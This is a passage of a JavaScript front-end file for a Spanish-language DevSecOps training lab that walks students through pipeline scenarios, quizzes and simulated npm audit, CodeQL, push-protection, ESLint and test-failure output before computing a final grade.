/**
 * src/main.js
 * Orquestador principal del laboratorio secuencial.
 * Maneja el flujo Welcome → 10 Labs → Completion.
 */

import { LABS } from './labs.js';
import {
  QUIZ_QUESTIONS, THREAT_SCENARIOS, LAB6_THREAT_IDS, LAB6_POINTS_PER_THREAT,
  evaluateThreatChallenge, checkQuizAnswer,
} from './challenges.js';
import { SCENARIOS, STAGE_DEFINITIONS, runPipelineScenario } from './pipeline.js';
import { CONTROL_MATRIX, getBlastRadius } from './controls.js';
import { generateGreeting } from './app.js';
import {
  Phase, startLab, markInteraction, selectAnswer,
  submitCurrentLab, advance, getState, getStudentInfo, getAllAnswers,
  recordThreatResult, getThreatResults, getRemainingInteractions,
} from './lab-engine.js';
import { recordLabScore, getTotalScore, getLabScores, getMaxScores, generateReport } from './scoring.js';

// ── DOM refs ──────────────────────────────────────────────────────────
const $welcome  = document.getElementById('screen-welcome');
const $lab      = document.getElementById('screen-lab');
const $complete = document.getElementById('screen-complete');
const $regForm  = document.getElementById('registration-form');
const $labMain  = document.getElementById('lab-main');
const $steps    = document.getElementById('progress-steps');
const $scoreDisp = document.getElementById('score-display');

// ── Init ──────────────────────────────────────────────────────────────
buildProgressDots();

$regForm.addEventListener('submit', e => {
  e.preventDefault();
  const name   = document.getElementById('student-name').value.trim();
  const github = document.getElementById('github-username').value.trim();
  if (!name || !github) return;
  startLab(name, github);
  switchScreen('lab');
  renderLab(0);
});

// ── Screen switching ──────────────────────────────────────────────────
function switchScreen(which) {
  [$welcome, $lab, $complete].forEach(el => el.hidden = true);
  if (which === 'welcome') $welcome.hidden = false;
  if (which === 'lab')     $lab.hidden     = false;
  if (which === 'complete') $complete.hidden = false;
}

// ── Progress dots ─────────────────────────────────────────────────────
function buildProgressDots() {
  $steps.innerHTML = '';
  for (let i = 0; i < 11; i++) {
    const dot = document.createElement('div');
    dot.className = 'lab-step-dot';
    dot.id = `step-dot-${i}`;
    dot.textContent = i + 1;
    dot.title = `Lab ${i + 1}`;
    $steps.appendChild(dot);
  }
}

function updateProgress(currentIndex) {
  const { submitted } = getState();
  for (let i = 0; i < 11; i++) {
    const dot = document.getElementById(`step-dot-${i}`);
    if (!dot) continue;
    dot.className = 'lab-step-dot' +
      (submitted[i] ? ' done' : i === currentIndex ? ' active' : '');
  }
  $scoreDisp.textContent = getTotalScore() + ' pts';
}

// ── Lab rendering ─────────────────────────────────────────────────────
function renderLab(index) {
  const lab = LABS[index];
  updateProgress(index);

  $labMain.innerHTML = `
    <div class="lab-header-block">
      <div class="lab-number">Lab ${lab.labNumber} de 11 &nbsp;·&nbsp; ${lab.maxPoints > 0 ? `${lab.maxPoints} puntos` : 'Síntesis final'}</div>
      <span class="section-concept">${lab.concept}</span>
      <h1 class="lab-title">${lab.title}</h1>
      <p class="lab-desc">${lab.description}</p>
    </div>
    <div class="lab-interactive" id="lab-interactive"></div>
    <div class="lab-challenge" id="lab-challenge">
      <div class="challenge-lock" id="challenge-lock">
        <span class="lock-icon">🔒</span>
        <span class="lock-hint-text" id="lock-hint">${lab.lockHint}</span>
      </div>
      <div class="challenge-question" id="challenge-question" hidden>
        <div class="question-timer" id="question-timer">
          <div class="timer-bar-track"><div class="timer-bar" id="timer-bar"></div></div>
          <span class="timer-label">Tiempo para responder:</span>
          <span class="timer-text" id="timer-text">60s</span>
        </div>
        <div id="quiz-content"></div>
      </div>
    </div>
    <div class="lab-submit" id="lab-submit">
      <button class="btn btn-primary btn-submit" id="submit-btn" disabled>
        ${index < 10 ? 'Enviar y continuar →' : 'Finalizar laboratorio →'}
      </button>
      <p class="submit-warning">Esta acción es permanente. No podrás modificar tu respuesta.</p>
    </div>
  `;

  mountInteractive(lab, index);
}

function onInteractionDone(key, labIndex) {
  const changed = markInteraction(key);
  if (changed) unlockChallenge(LABS[labIndex]);
  // Update remaining hint
  const rem = getRemainingInteractions();
  const hint = document.getElementById('lock-hint');
  if (hint && rem.length > 0) {
    hint.textContent = LABS[labIndex].lockHint;
  }
}

function unlockChallenge(lab) {
  const lock = document.getElementById('challenge-lock');
  const qBox = document.getElementById('challenge-question');
  if (!lock || !qBox) return;
  lock.hidden = true;
  qBox.hidden = false;

  if (lab.questionId) {
    renderQuiz(lab.questionId, lab.index);
  } else if (lab.interactiveKey === 'threat-challenge') {
    renderThreatSynthesisPrompt(lab.index);
  }

  startQuestionTimer(lab.index);

  // Auto-scroll so the question is visible
  setTimeout(() => qBox.scrollIntoView({ behavior: 'smooth', block: 'start' }), 80);
}

// ── Quiz rendering ────────────────────────────────────────────────────
function renderQuiz(questionId, labIndex) {
  const q = QUIZ_QUESTIONS.find(x => x.id === questionId);
  if (!q) return;
  const qBox = document.getElementById('quiz-content');

  const optionsHtml = q.options.map(opt => `
    <button class="quiz-option" data-answer="${opt.id}" aria-pressed="false">
      <span class="quiz-option-key">${opt.id.toUpperCase()}.</span>
      <span>${escHtml(opt.text)}</span>
    </button>
  `).join('');

  qBox.innerHTML = `
    <h3>❓ ${escHtml(q.question)}</h3>
    <div class="quiz-options">${optionsHtml}</div>
    <div class="quiz-explanation" id="quiz-explanation" hidden></div>
  `;

  qBox.querySelectorAll('.quiz-option').forEach(btn => {
    btn.addEventListener('click', () => {
      const answerId = btn.dataset.answer;
      if (!selectAnswer(answerId)) return;
      // Visually select
      qBox.querySelectorAll('.quiz-option').forEach(b => {
        b.classList.remove('selected');
        b.setAttribute('aria-pressed', 'false');
      });
      btn.classList.add('selected');
      btn.setAttribute('aria-pressed', 'true');
      // Enable submit
      const sub = document.getElementById('submit-btn');
      if (sub) sub.disabled = false;
      sub.onclick = () => handleSubmit(labIndex);
    });
  });
}

function renderThreatSynthesisPrompt(labIndex) {
  const qBox = document.getElementById('quiz-content');
  const results = getThreatResults();
  const hits = LAB6_THREAT_IDS.filter(id => results[id]?.primaryHit).length;
  const pts = hits * LAB6_POINTS_PER_THREAT;

  qBox.innerHTML = `
    <div class="threat-synthesis">
      <h3>📊 Resultado de la evaluación</h3>
      <p>Identificaste el control primario correcto en <strong>${hits}/2</strong> amenazas.</p>
      <p class="pts-earned">Puntos obtenidos: <strong>${pts} / 16</strong></p>
      <p>Haz clic en "Enviar" para continuar al siguiente lab.</p>
    </div>
  `;
  // For lab 6, we use a synthetic answer id = "threat-eval"
  selectAnswer('threat-eval');
  const sub = document.getElementById('submit-btn');
  if (sub) { sub.disabled = false; sub.onclick = () => handleSubmit(labIndex); }
}

// ── Question timer ────────────────────────────────────────────────────
let _timerInterval = null;
let _timerSec = 60;

function startQuestionTimer(labIndex) {
  clearQuestionTimer();
  _timerSec = 60;
  _renderTimerUI();
  _timerInterval = setInterval(() => {
    _timerSec--;
    _renderTimerUI();
    if (_timerSec <= 0) {
      clearQuestionTimer();
      _onTimerExpired(labIndex);
    }
  }, 1000);
}

function clearQuestionTimer() {
  if (_timerInterval) { clearInterval(_timerInterval); _timerInterval = null; }
  const el = document.getElementById('question-timer');
  if (el) el.hidden = true;
}

function _renderTimerUI() {
  const el = document.getElementById('question-timer');
  const bar = document.getElementById('timer-bar');
  const text = document.getElementById('timer-text');
  if (!el) return;
  el.hidden = false;
  if (bar) {
    bar.style.width = `${(_timerSec / 60) * 100}%`;
    bar.className = 'timer-bar' +
      (_timerSec <= 10 ? ' timer-critical' : _timerSec <= 20 ? ' timer-warning' : '');
  }
  if (text) {
    text.textContent = `${_timerSec}s`;
    text.className = 'timer-text' + (_timerSec <= 10 ? ' timer-critical' : '');
  }
}

function _onTimerExpired(labIndex) {
  const { labPhase } = getState();
  if (labPhase === 'challenge') selectAnswer('__timeout__');
  if (labPhase === 'challenge' || labPhase === 'answered') handleSubmit(labIndex);
}

// ── Submit handler ────────────────────────────────────────────────────
function handleSubmit(labIndex) {
  clearQuestionTimer();
  const lab = LABS[labIndex];
  const result = submitCurrentLab((idx, answerId) => {
    if (lab.interactiveKey === 'threat-challenge') {
      const threats = getThreatResults();
      const hits = LAB6_THREAT_IDS.filter(id => threats[id]?.primaryHit).length;
      const pts = hits * LAB6_POINTS_PER_THREAT;
      return { points: pts, maxPoints: lab.maxPoints };
    }
    const check = checkQuizAnswer(lab.questionId, answerId);
    return { points: check.correct ? lab.maxPoints : 0, maxPoints: lab.maxPoints };
  });

  if (!result) return;
  recordLabScore(labIndex, result.points);
  updateProgress(labIndex);

  // Show result feedback
  showSubmissionFeedback(lab, result);
}

function showSubmissionFeedback(lab, result) {
  const sub = document.getElementById('lab-submit');
  const correct = result.points === result.maxPoints;
  const partial = result.points > 0 && result.points < result.maxPoints;

  // Lock quiz options
  document.querySelectorAll('.quiz-option').forEach(btn => {
    btn.disabled = true;
    const answerId = btn.dataset.answer;
    const q = lab.questionId ? QUIZ_QUESTIONS.find(x => x.id === lab.questionId) : null;
    if (q) {
      const opt = q.options.find(o => o.id === answerId);
      if (opt?.correct) btn.classList.add('correct');
      else if (btn.classList.contains('selected')) btn.classList.add('incorrect');
    }
  });

  // Show explanation
  if (lab.questionId) {
    const q = QUIZ_QUESTIONS.find(x => x.id === lab.questionId);
    const expEl = document.getElementById('quiz-explanation');
    if (q && expEl) {
      expEl.hidden = false;
      expEl.innerHTML = `<div class="explanation-box ${correct ? 'correct' : partial ? 'partial' : 'incorrect'}">
        <strong>${correct ? '✓ Correcto' : partial ? '◐ Parcialmente correcto' : '✗ Incorrecto'}</strong>
        <p>${escHtml(q.explanation)}</p>
      </div>`;
    }
  }

  // Replace submit with continue
  sub.innerHTML = `
    <div class="submit-result ${correct ? 'result-correct' : partial ? 'result-partial' : 'result-incorrect'}">
      ${correct ? '✓ ¡Correcto!' : partial ? `◐ ${result.points}/${result.maxPoints} puntos` : '✗ Incorrecto — 0 puntos'}
    </div>
    <button class="btn btn-primary btn-submit" id="continue-btn">
      ${getState().currentLabIndex < 10 ? 'Continuar al Lab ' + (getState().currentLabIndex + 2) + ' →' : 'Ver mi nota final →'}
    </button>
  `;

  document.getElementById('continue-btn').onclick = () => {
    advance();
    const st = getState();
    if (st.phase === Phase.COMPLETE) {
      renderCompletion();
    } else {
      renderLab(st.currentLabIndex);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  };
}

// ── Grade messages ────────────────────────────────────────────────────
function getGradeInfo(pct) {
  if (pct === 100) return {
    grade: 'S', emoji: '🏆',
    label: 'Legendario',
    msg: 'Nota perfecta. GitHub Security te ofrece trabajo sin entrevista técnica.',
  };
  if (pct >= 90) return {
    grade: 'A', emoji: '🔐',
    label: 'Excelente',
    msg: 'Solo te escaparon los zero-days — y esos no los para nadie.',
  };
  if (pct >= 80) return {
    grade: 'B', emoji: '🛡️',
    label: 'Bien',
    msg: 'npm audit te respeta. CodeQL te añadió a sus contactos.',
  };
  if (pct >= 70) return {
    grade: 'C', emoji: '⚠️',
    label: 'Satisfactorio',
    msg: 'Aprobado. El atacante tomó el día libre justo hoy. Qué suerte.',
  };
  if (pct >= 60) return {
    grade: 'D', emoji: '🔓',
    label: 'Suficiente',
    msg: 'Tu pipeline tiene más huecos que el queso suizo... pero el deploy llegó.',
  };
  if (pct >= 50) return {
    grade: 'D-', emoji: '😬',
    label: 'Rasante',
    msg: 'El PR malicioso quedó en revisión pendiente. Por suerte alguien estaba de vacaciones.',
  };
  return {
    grade: 'F', emoji: '💀',
    label: 'Insuficiente',
    msg: 'El atacante ya está en producción. Te mandó una PR de agradecimiento con emojis.',
  };
}

// ── Completion screen ─────────────────────────────────────────────────
async function renderCompletion() {
  switchScreen('complete');
  const { name, github } = getStudentInfo();
  const scores = getLabScores();
  const maxScores = getMaxScores();
  const total = getTotalScore();
  const pct = Math.round((total / 100) * 100);
  const { grade, emoji, label, msg } = getGradeInfo(pct);

  const breakdownHtml = LABS.map((lab, i) => `
    <div class="breakdown-row">
      <span>Lab ${lab.labNumber} — ${lab.concept}</span>
      <span class="${scores[i] === maxScores[i] ? 'score-full' : scores[i] > 0 ? 'score-partial' : 'score-zero'}">
        ${scores[i]}/${maxScores[i]}
      </span>
    </div>
  `).join('');

  document.getElementById('final-score').textContent = `${total} / 100`;
  document.getElementById('final-grade').innerHTML =
    `${emoji} <strong>${grade} — ${label}</strong> (${pct}%)<br><span class="grade-msg">${msg}</span>`;
  document.getElementById('score-breakdown').innerHTML = breakdownHtml;

  // Generate HMAC report
  const answers = getAllAnswers();
  const reportCode = await generateReport(name, github, answers);
  const reportEl = document.getElementById('report-code');
  reportEl.textContent = reportCode;

  document.getElementById('copy-report-btn').onclick = () => {
    navigator.clipboard.writeText(reportCode).then(() => {
      document.getElementById('copy-report-btn').textContent = '✓ Copiado';
      setTimeout(() => {
        document.getElementById('copy-report-btn').textContent = '📋 Copiar código';
      }, 2000);
    });
  };

  // Display student info
  document.getElementById('completion-student-name').textContent = name;
  document.getElementById('completion-github').textContent = '@' + github;
}

// ── Interactive component builders ───────────────────────────────────
function mountInteractive(lab, labIndex) {
  const container = document.getElementById('lab-interactive');
  switch (lab.interactiveKey) {
    case 'pipeline':          buildPipeline(container, lab, labIndex);          break;
    case 'scanner-gate':      buildScannerGate(container, labIndex);            break;
    case 'controls':          buildControls(container, lab, labIndex);          break;
    case 'blast-radius':      buildBlastRadius(container, labIndex);            break;
    case 'threat-challenge':  buildThreatChallenge(container, lab, labIndex);   break;
    case 'xss-demo':          buildXssDemo(container, labIndex);                break;
    case 'architecture':      buildArchitecture(container, labIndex);           break;
    case 'matrix':            buildMatrix(container, labIndex);                 break;
    case 'incident-timeline': buildIncidentTimeline(container, labIndex);       break;
  }
}

// ── Pipeline component ────────────────────────────────────────────────
function buildPipeline(container, lab, labIndex) {
  const scenarioKey = lab.scenarioToRun;
  const requiredScenario = SCENARIOS[scenarioKey];

  const scenarioOpts = Object.entries(SCENARIOS).map(([key, s]) =>
    `<option value="${key}" ${key === scenarioKey ? 'selected' : ''}>${escHtml(s.name)}</option>`
  ).join('');

  container.innerHTML = `
    <div class="pipeline-panel">
      <div class="pipeline-controls">
        <div class="required-scenario-hint">
          ⭐ Para este lab ejecuta: <strong>${escHtml(requiredScenario.name)}</strong>
        </div>
        <select id="scenario-select" class="scenario-select">
          ${scenarioOpts}
        </select>
        <button class="btn btn-primary" id="run-pipeline-btn">▶ Ejecutar Pipeline</button>
      </div>
      <div class="pipeline-stages" id="pipeline-stages">
        ${STAGE_DEFINITIONS.map(s => `
          <div class="pipeline-stage waiting" id="stage-${s.id}">
            <div class="stage-icon">${s.icon}</div>
            <div class="stage-label">${s.label}</div>
            <div class="stage-badge badge-waiting">ESPERA</div>
          </div>
        `).join('')}
      </div>
      <div class="pipeline-log" id="pipeline-log" hidden>
        <div class="log-header">Terminal</div>
        <div class="log-body" id="log-body"></div>
      </div>
      <div class="pipeline-insight" id="pipeline-insight" hidden></div>
    </div>
  `;

  let running = false;
  document.getElementById('run-pipeline-btn').onclick = () => {
    if (running) return;
    running = true;
    const sel = document.getElementById('scenario-select').value;
    const result = runPipelineScenario(sel);
    if (!result) { running = false; return; }
    animatePipeline(result, () => {
      running = false;
      // Check if this is the required interaction
      const requiredInt = lab.requiredInteractions[0];
      if (sel === 'healthy' && requiredInt === 'pipeline-run-healthy') {
        onInteractionDone('pipeline-run-healthy', labIndex);
      } else if (sel === 'vulnerable-dependency' && requiredInt === 'pipeline-run-vulnerable-dep') {
        onInteractionDone('pipeline-run-vulnerable-dep', labIndex);
      } else if (sel === 'secret-detected' && requiredInt === 'pipeline-run-secret-detected') {
        onInteractionDone('pipeline-run-secret-detected', labIndex);
      }
    });
  };
}

function animatePipeline(scenario, onComplete) {
  const logEl = document.getElementById('pipeline-log');
  const logBody = document.getElementById('log-body');
  const insightEl = document.getElementById('pipeline-insight');
  logEl.hidden = false;
  logBody.innerHTML = '';
  insightEl.hidden = true;

  // Reset stages
  STAGE_DEFINITIONS.forEach(s => {
    const el = document.getElementById(`stage-${s.id}`);
    if (el) { el.className = 'pipeline-stage waiting'; el.querySelector('.stage-badge').textContent = 'ESPERA'; el.querySelector('.stage-badge').className = 'stage-badge badge-waiting'; }
  });

  let stageIdx = 0;

  function nextStage() {
    if (stageIdx >= STAGE_DEFINITIONS.length) {
      // Show insight
      if (scenario.insight) {
        insightEl.hidden = false;
        insightEl.innerHTML = `<div class="insight-box"><strong>💡 Conclusión:</strong> ${escHtml(scenario.insight)}</div>`;
      }
      if (scenario.finding) showFinding(scenario.finding);
      onComplete();
      return;
    }
    const stageDef = STAGE_DEFINITIONS[stageIdx];
    const stageData = scenario.stages[stageDef.id];
    const el = document.getElementById(`stage-${stageDef.id}`);
    if (el) {
      el.querySelector('.stage-badge').textContent = 'EN CURSO';
      el.querySelector('.stage-badge').className = 'stage-badge badge-running';
      el.className = 'pipeline-stage running';
    }
    setTimeout(() => {
      if (el) {
        const r = stageData.result;
        el.className = `pipeline-stage ${r.toLowerCase()}`;
        const badge = el.querySelector('.stage-badge');
        badge.textContent = r === 'PASSED' ? 'PASÓ' : r === 'FAILED' ? 'FALLÓ' : 'BLOQUEADO';
        badge.className = `stage-badge badge-${r.toLowerCase()}`;
      }
      // Add log lines for this stage
      const stageLogs = scenario.logs.filter(l => {
        const prefix = stageDef.id === 'calidad' ? '[QUALITY]' :
          stageDef.id === 'pruebas' ? '[TEST]' :
          stageDef.id === 'sca' ? '[SCA]' :
          stageDef.id === 'sast' ? '[SAST]' :
          stageDef.id === 'revision' ? '[REVIEW]' :
          stageDef.id === 'merge' ? '[MERGE]' :
          stageDef.id === 'deploy' ? '[DEPLOY]' :
          stageDef.id === 'evento' ? '[EVENT]' : '';
        return l.startsWith(prefix) || l.startsWith('[RUNNER]');
      });
      stageLogs.slice(0, 2).forEach(line => {
        const el2 = document.createElement('div');
        el2.className = 'log-line';
        el2.textContent = line;
        logBody.appendChild(el2);
        logBody.scrollTop = logBody.scrollHeight;
      });
      stageIdx++;
      setTimeout(nextStage, 400);
    }, 600);
  }
  nextStage();
}

function showFinding(finding) {
  const insEl = document.getElementById('pipeline-insight');
  if (!insEl) return;
  insEl.innerHTML += buildFindingEvidence(finding);
}

function buildFindingEvidence(finding) {
  const ctrl = finding.control || '';
  const sev = (finding.severity || 'HIGH').toLowerCase();

  if (ctrl.includes('npm audit') || ctrl.includes('SCA')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">npm audit · Software Composition Analysis</span>
          <span class="evidence-sev sev-${sev}">${finding.severity}</span>
        </div>
        <pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

# npm audit report

${escHtml(finding.package || 'vulnerable-package')}  &lt;1.1.0
Severity:     <span class="hl-red">high</span>
Title:        ${escHtml(finding.title)}
CVE:          ${escHtml(finding.cve || 'CVE-DEMO-2024-0001')}
Description:  ${escHtml(finding.message || '')}
Patched in:   >=1.1.0
Fix:          npm audit fix
node_modules/${(finding.package || 'vulnerable-package').split('@')[0]}

<span class="hl-red">1 high severity vulnerability</span>

npm error code EAUDITLEVEL
npm error audit found 1 HIGH severity vulnerability
npm error The \`--audit-level\` flag must be satisfied.
<span class="hl-red">Process exited with code 1</span></pre>
        <div class="evidence-meta">
          <span>Política aplicada: <code>--audit-level=high → FAIL si HIGH o CRITICAL</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('CodeQL') || ctrl.includes('SAST')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">GitHub Code Scanning · CodeQL</span>
          <span class="evidence-sev sev-${sev}">${finding.rule || 'js/xss'} · ${finding.severity}</span>
        </div>
        <div class="evidence-codeql">
          <div class="codeql-rule">
            <span class="codeql-badge">Rule</span> ${escHtml(finding.rule || 'js/xss')}
            &nbsp;&nbsp;<span class="codeql-badge">Severity</span> Error (High)
          </div>
          <div class="codeql-title">${escHtml(finding.title)}</div>
          <div class="codeql-flow">
            <div class="flow-step flow-source">
              <span class="flow-label">Source</span>
              <code>${escHtml(finding.source || 'Entrada controlada por el usuario (src/demo.js:38)')}</code>
            </div>
            <div class="flow-arrow">↓ &nbsp;taint flows through template literal</div>
            <div class="flow-step flow-sink">
              <span class="flow-label">Sink</span>
              <code>${escHtml(finding.sink || 'innerHTML (src/demo.js:45)')}</code>
            </div>
          </div>
          <p class="codeql-desc">Este flujo de datos permite a un atacante inyectar HTML o JavaScript arbitrario si controla la entrada de la fuente.</p>
        </div>
        <div class="evidence-meta">
          <span>Política: <code>${escHtml(finding.policy || '')}</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('Secret') || ctrl.includes('Push Protection')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">git push · GitHub Push Protection</span>
          <span class="evidence-sev sev-critical">CRITICAL</span>
        </div>
        <pre class="evidence-terminal evidence-fail">$ git push origin feature/config

Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 412 bytes | 412.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: Resolving deltas: 100% (2/2), completed with 2 local objects.
remote: <span class="hl-red">error: GH013: Repository rule violations found for refs/heads/feature/config.</span>
remote:
remote: <span class="hl-red">- GITHUB PUSH PROTECTION</span>
remote:   ——————————————————————————————————————
remote:   Resolve the following secrets before pushing again.
remote:
remote:   (?) GitHub Personal Access Token found in commit <span class="hl-yellow">a3f9c12</span>:
remote:       <span class="hl-yellow">${escHtml(finding.file || 'config/settings.js')}, line ${finding.line || 3}</span>
remote:
remote:   To push, remove the secret from commit(s) or allow the secret:
remote:   https://github.com/neavus-23/.../security/secret-scanning/unblock-secret/...
remote:
To https://github.com/neavus-23/Helllo-Secure-World.git
<span class="hl-red"> ! [remote rejected] feature/config -&gt; feature/config (push declined due to repository rule violations)</span>
error: failed to push some refs to 'https://github.com/neavus-23/Helllo-Secure-World.git'</pre>
        <div class="evidence-meta">
          <span>Política: <code>Secreto detectado → push rechazado antes de llegar al historial</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('ESLint')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">ESLint · Quality Gate</span>
          <span class="evidence-sev sev-quality">QUALITY</span>
        </div>
        <pre class="evidence-terminal evidence-fail">$ npx eslint src/

<span class="hl-yellow">/workspace/src/app.js</span>
  12:7  <span class="hl-red">error</span>  '${escHtml((finding.message || '').replace("Variable declarada pero no utilizada: '", '').replace("'", ''))}' is defined but never used  <span class="hl-blue">no-unused-vars</span>

<span class="hl-red">✖ 1 problem (1 error, 0 warnings)</span>

npm error Exit code: 1</pre>
        <div class="evidence-meta">
          <span>Regla violada: <code>no-unused-vars</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('Pruebas') || ctrl.includes('Vitest')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">Vitest · Pruebas Automatizadas</span>
          <span class="evidence-sev sev-test">REGRESIÓN</span>
        </div>
        <pre class="evidence-terminal evidence-fail"><span class="hl-red">FAIL</span>  tests/app.test.js &gt; generateGreeting &gt; saluda por nombre

<span class="hl-red">AssertionError: expected value to deeply equal:</span>
<span class="hl-green">  + Expected: '¡Hola, Eddy! Bienvenido al laboratorio de pipeline seguro.'</span>
<span class="hl-red">  - Received:  'Hello Eddy! Welcome to the secure pipeline lab.'</span>

 ❯ tests/app.test.js:12:3

<span class="hl-red"> Tests  1 failed</span> | 7 passed (8)
 Duration  312ms

npm error Exit code: 1</pre>
        <div class="evidence-meta">
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('Revisión') || ctrl.includes('Code Review')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">GitHub Pull Request · Revisión de Código</span>
          <span class="evidence-sev sev-review">CAMBIOS REQUERIDOS</span>
        </div>
        <div class="evidence-review">
          <div class="review-header">
            <span class="review-avatar">👤</span>
            <div>
              <strong>security-reviewer</strong> requested changes
              <span class="review-time">hace 2 horas</span>
            </div>
            <span class="review-badge review-changes">Changes requested</span>
          </div>
          <div class="review-comment">
            <p>⚠️ <strong>Problema de seguridad detectado:</strong> ${escHtml(finding.message || '')}</p>
            <p>${escHtml(finding.comment || 'Los scanners automatizados no detectaron este problema de diseño lógico. Se requiere rediseño antes del merge.')}</p>
            <p class="review-note">📌 Los controles automatizados pasaron — esto demuestra que la revisión humana es complementaria, no redundante.</p>
          </div>
        </div>
        <div class="evidence-meta">
          <span>Política: <code>Aprobación requerida — PR bloqueado hasta resolución</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  // Fallback genérico
  return `
    <div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">${escHtml(finding.control)}</span>
        <span class="evidence-sev sev-${sev}">${finding.severity}</span>
      </div>
      <div class="evidence-generic">
        <strong>${escHtml(finding.title)}</strong>
        <p>${escHtml(finding.message || '')}</p>
      </div>
      <div class="evidence-meta">
        <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
        <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
      </div>
    </div>`;
}

// ── Scanner-Gate animation ────────────────────────────────────────────
function buildScannerGate(container, labIndex) {
  const steps = [
    { icon: '🔍', label: 'Scanner ejecuta', desc: 'npm audit analiza el árbol de dependencias.' },
    { icon: '📋', label: 'Genera hallazgo', desc: 'Encuentra lodash@4.17.4 — CVE-2020-8203, severidad HIGH.' },
    { icon: '📏', label: 'Política evalúa', desc: 'Regla: "HIGH o CRITICAL → FAIL". El hallazgo supera el umbral.' },
    { icon: '🚦', label: 'Decisión: BLOCK', desc: 'El job falla con exit code ≠ 0.' },
    { icon: '✅', label: 'Required Check', desc: 'El status check "security" aparece como FAILED en GitHub.' },
    { icon: '🔒', label: 'Merge bloqueado', desc: 'Branch Protection requiere el check — el PR no puede mergearse.' },
  ];

  const stepsHtml = steps.map((s, i) => `
    <div class="gate-step" id="gate-step-${i}" style="opacity:0.3">
      <div class="gate-step-icon">${s.icon}</div>
      <div class="gate-step-body">
        <strong>${s.label}</strong>
        <p>${s.desc}</p>
      </div>
    </div>
  `).join('<div class="gate-arrow">↓</div>');

  container.innerHTML = `
    <div class="scanner-gate-panel">
      <div class="gate-callout">
        <strong>Scanner ≠ Security Gate.</strong>
        Un scanner detecta. Un Security Gate usa esa detección para controlar el merge.
      </div>
      <div class="gate-steps" id="gate-steps">${stepsHtml}</div>
      <button class="btn btn-primary" id="animate-gate-btn" style="margin-top:1rem">
        ▶ Animar el flujo
      </button>
    </div>
  `;

  let animated = false;
  document.getElementById('animate-gate-btn').onclick = () => {
    if (animated) return;
    animated = true;
    document.getElementById('animate-gate-btn').disabled = true;
    animateGateSteps(steps, () => {
      onInteractionDone('gate-animation-complete', labIndex);
      const panel = document.querySelector('.scanner-gate-panel');
      if (panel) {
        const ev = document.createElement('div');
        ev.innerHTML = `
          <div class="evidence-panel" style="margin-top:1.5rem">
            <div class="evidence-header">
              <span class="evidence-tool">npm audit · Lo que el desarrollador vio en CI</span>
              <span class="evidence-sev sev-high">HIGH</span>
            </div>
            <pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

# npm audit report

lodash  &lt;4.17.21
Severity:     <span class="hl-red">high</span>
CVE:          CVE-2020-8203
Title:        Prototype Pollution via constructor
Fix:          npm audit fix
node_modules/lodash

<span class="hl-red">1 high severity vulnerability</span>

npm warn EBADENGINE Unsupported engine
npm error code EAUDITLEVEL
npm error severity \`high\` is &gt;= \`high\`
<span class="hl-red">Process exited with code 1</span>

# 📋  El scanner DETECTÓ y REPORTÓ la vulnerabilidad
# 🚦  La política HIGH=FAIL generó una decisión de BLOCK
# ✅  El status check "security" aparece como FAILED en GitHub
# 🔒  Branch Protection requiere "security" → merge BLOQUEADO</pre>
            <div class="evidence-meta">
              <span>Sin Branch Protection → el scanner detecta, pero nadie impide el merge</span>
              <span>Con Branch Protection → el required check convierte el scanner en <code>Security Gate</code></span>
            </div>
          </div>`;
        panel.appendChild(ev);
      }
    });
  };
}

function animateGateSteps(steps, onComplete) {
  let i = 0;
  function next() {
    if (i >= steps.length) { onComplete(); return; }
    const el = document.getElementById(`gate-step-${i}`);
    if (el) { el.style.opacity = '1'; el.style.transition = 'opacity 0.4s'; }
    i++;
    setTimeout(next, 700);
  }
  next();
}

// ── Controls explorer ─────────────────────────────────────────────────
function buildControls(container, lab, labIndex) {
  const rows = CONTROL_MATRIX.map(c => `
    <div class="control-card ${c.id === lab.targetControl ? 'control-highlight' : ''}"
         data-id="${c.id}" tabindex="0" role="button" aria-label="Ver control ${c.name}">
      <div class="control-card-header">
        <span class="control-name">${c.name}</span>
        <span class="control-badge cat-${c.controlType}">${c.category}</span>
      </div>
      <div class="control-decision">Decisión: <strong>${c.decision}</strong></div>
    </div>
  `).join('');

  container.innerHTML = `
    <div class="controls-panel">
